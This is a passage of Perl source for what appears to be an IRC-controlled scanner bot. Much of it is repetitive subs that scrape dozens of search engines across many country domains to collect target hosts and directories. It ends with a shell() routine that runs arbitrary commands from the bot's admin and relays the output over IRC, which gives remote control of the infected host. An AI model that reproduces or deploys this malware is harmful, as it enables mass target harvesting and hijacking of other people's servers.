    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=uk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingUK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ca&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCA/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=br&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=fr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingFR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=es&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingES/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=it&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingIT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingBE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=be&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingPT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=pt&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingPT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=no&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNO/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=dk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=se&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingSE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingCH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ch&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCH/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nz&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNZ/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ru&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingRU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingJP/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCN/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingKR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingMX/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub google2() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
    for ($b=1; $b<=200; $b+=10) {
        my $search = ("http://www.google.".$dom."/search?q=".uri_escape($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            if ($1 !~ /google/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    } return @list;
}
}

sub walla() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=500; $b+=1) {
        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /walla\.co\.il/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=1000; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link !~ /yahoo\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=500; $i+=10) {
        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /ask\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() {
	my @list;
	my $key = $_[0];
	my $b   = 0;
	for ($b=1; $b<=200; $b+=10) {
		my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));
		my $res = &search_engine_query($search);
		while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {
			my $link = $1;
			if ($link !~ /onet|webcache|query/){
				my @grep = &links($link);
                push(@list,@grep);
			}
		}
	}
	return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=100; $b+=10) {
        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");
        my $res = &search_engine_query($search);
		if ($res !~ /next/) {$b=100;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /yippy\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=300; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^\"]*)\"/g) {
			my $link = $1;
            if ($link !~ /google/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sapo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=100; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");
        my $res = &search_engine_query($search);
		if ($res !~ m/Next/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /\.sapo\.pt/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lycos() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link !~ /lycos\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub uol() {
	my @list;
	my $key = $_[0];
    for ($b=0; $b<=300; $b+=10) {
        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);
        my $res = &search_engine_query($search);
		if ($res =~ m/retornou nenhum resultado/i) {$b=500;}
        while ($res =~ m/href=\"http:\/\/([^\">]*)\"/g) {
            my $link = $1;
            if ($link !~ /uol\.com\.br|\/web/i){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub seznam() {
	my @list;
	my $key = $_[0];
    for ($b=1; $b<=300; $b+=20) {
        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=20&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/([^\">]*)\"/g) {
            my $link = $1;
            if ($link !~ /seznam\.cz|chytrevyhledavani\.cz|smobil\.cz|sklik\.cz/i){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=100; $b+=1) {
        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /hotbot\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub aol() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=300; $b+=10) {
		my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);
		my $res = &search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
			my $link = $1;
			if ($link !~ /aol\.com/){
				my @grep = &links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub biglobe {
  my $key = $_[0];
  my @list;
  for ($b=1; $b<=500; $b+=10) {
    $num += $num;
    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";
    my $res = &search_engine_query($search);
    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
	    my $link = $1;
        if ($link !~ /biglobe/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kvasir(){
  my @list;
    my $key = $_[0];
    for (my $i=10; $i<=1000; $i+=100){
        my $search = ("http://www.kvasir.no/nettsok?offset=".$i."&pageSize=100&q=".uri_escape($key)."");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link !~ /kvasir/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rediff() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=300; $i+=10) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".uri_escape($key)."&iss=&submit=Search&firstres=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
        if ($1 !~ /rediff\.com/){
        my $link = $1;
	my @grep = &links($link);
	push(@list,@grep);
		}
        }
    }
    return @list;
}

sub sizuka() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".uri_escape($key)."&start=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a title=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /szukacz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub naver() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".uri_escape($key)."&docid=0&lang=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=10");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /naver/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub interia() {
    my @list;
    my $key = $_[0];
    for ($i = 0;$i<= 100; $i+= 10) {
           my $search = ( "http://www.google.interia.pl/szukaj?q=".uri_escape($key)."&s=szukaj&w=sw&szukaj=&p=".$i);
           my $res = &search_engine_query($search);
           while ($res =~ m/text-decoration: none;\">http:\/\/(.+?)\/(.*)<\/a>/g) {
                my $link = $1;
                if ($link!~ /google|interia/) {
                   my @grep=links($link);
                   push(@list,@grep);
           }
       }
   }
  return @list;
}
sub dogpile() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=150; $i+=10){
        my $search = ("http://www.dogpile.com/info.dogpl.t2.7/search/web?qsi=".$i."&q=".uri_escape($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /dogpile/){
            my $link = $1;
                my @grep = &links($link);
            }
        }
    }
    return @list;
}
sub duck() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://duckduckgo.com/html/?q=".uri_escape($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /duckduckgo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub black() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://blekko.com/#?q=".uri_escape($key)."?ft=&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/class=\"UrlTitleLine\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /blekko/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub snz() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://searchnz.co.nz/search.aspx?q=".uri_escape($key)."&np=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {
            my $link = $1;
            if ($link!~ /searchnz/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bypass() { 
  my @list; 
  my $key = $_[0]; 
  my $search = ("http://www.specialind.it/google.php?key=".uri_escape($key)."");
  my $res = search_engine_query($search); 
  while ($res =~ m/<a href=\"\/url\?q=\http:\/\/([^>\"]*)\//g) { 
  if ($1 !~ /google/){ my $link = $1; my @grep = &links($link); 
  push(@list,@grep); } } 
  return @list; 
}

########## SEARCH ENGINE END ##########

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub links() {
    my @list;
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    push(@list,$host,$hdir);
    return @list;
}

sub search_engine_query() {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host = $url;
	my $query = $url;
	my $page  = "";
	$host =~ s/href=\"?http:\/\///;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ($query eq "") { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
			my $sget = "GET $query HTTP/1.0\r\n";
			$sget .= "Host: $host\r\n";
			$sget .= "Accept: */*\r\n";
			$sget .= "User-Agent: $uagent\r\n";
			$sget .= "Connetion: Close\r\n\r\n";
			print $sock $sget;
			my @pages = <$sock>;
			$page = "@pages";
			close($sock);
		};
	return $page;
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 3; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}
sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}
####### EoF CoDe ##########
